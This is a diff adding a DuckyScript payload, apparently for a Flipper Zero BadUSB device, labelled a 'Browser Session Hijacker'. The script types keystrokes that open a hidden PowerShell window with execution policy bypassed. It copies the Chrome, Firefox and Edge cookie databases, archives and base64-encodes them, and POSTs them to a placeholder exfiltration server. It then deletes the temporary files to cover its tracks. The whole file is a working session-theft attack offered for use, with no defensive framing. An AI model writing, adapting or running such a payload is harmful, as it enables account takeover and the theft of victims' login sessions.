@@ -1,0 +1,17 @@
+REM ===============================================================
+REM Browser Session Hijacker - NullSec Flipper Suite
+REM Extracts browser cookies and session data
+REM ===============================================================
+REM Target: Windows
+REM Author: bad-antics
+REM ===============================================================
+
+GUI r
+DELAY 200
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING $cookies = @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies","$env:APPDATA\Mozilla\Firefox\Profiles\*\cookies.sqlite","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"); $out = ""; foreach($c in $cookies){if(Test-Path $c){Copy-Item $c "$env:TEMP\c_$(Get-Random).db"}}; Compress-Archive "$env:TEMP\c_*.db" "$env:TEMP\cookies.zip"; [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\cookies.zip")) | Out-File "$env:TEMP\c.txt"; Invoke-WebRequest -Uri "http://EXFIL_SERVER/cookies" -Method POST -Body (Get-Content "$env:TEMP\c.txt" -Raw); Remove-Item "$env:TEMP\c*" -Force
+ENTER
+STRING exit
+ENTER
